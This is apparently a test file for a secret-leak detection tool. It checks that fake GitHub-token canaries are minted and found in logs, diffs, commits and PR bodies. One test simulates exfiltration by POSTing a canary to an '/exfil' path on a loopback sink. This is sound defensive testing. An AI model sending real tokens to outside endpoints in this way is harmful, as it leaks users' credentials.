import { describe, expect, it } from 'vitest';
import { mintCanary, scanForCanary } from '../src/canary.ts';
import { EgressSink } from '../src/egress.ts';

describe('canary scanner', () => {
  it('mints a distinct GH_TOKEN=fiks-canary token each time', () => {
    const a = mintCanary();
    const b = mintCanary();
    expect(a.value).toMatch(/^GH_TOKEN=fiks-canary-[0-9a-f]{24}$/);
    expect(a.secret).not.toBe(b.secret);
    expect(a.name).toBe('GH_TOKEN');
  });

  it('finds a planted canary in a synthetic log, diff, commit message and PR body', () => {
    const { secret } = mintCanary();
    const res = scanForCanary(secret, {
      log: `running tests\nleaked ${secret}\n`,
      diff: `+ const t = '${secret}';`,
      commit: `fix: patch\n\n${secret}`,
      pr: `This PR fixes the bug. ${secret}`,
      clean: 'nothing sensitive here',
    });
    expect(res.found).toBe(true);
    expect(res.locations.sort()).toEqual(['commit', 'diff', 'log', 'pr']);
  });

  it('does not fire on text without the secret', () => {
    const { secret } = mintCanary();
    expect(scanForCanary(secret, { a: 'clean', b: 'also clean' }).found).toBe(false);
  });
});

describe('egress sink', () => {
  it('records bytes sent to a live loopback server and scans them', async () => {
    const sink = new EgressSink();
    const url = await sink.listen();
    expect(url).toMatch(/^http:\/\/127\.0\.0\.1:\d+$/);
    const { secret } = mintCanary();
    await fetch(`${url}/exfil`, { method: 'POST', body: secret });
    // give the server a tick to record
    await new Promise((r) => setTimeout(r, 20));
    expect(sink.hitsContaining(secret).length).toBe(1);
    await sink.close();
  });
});
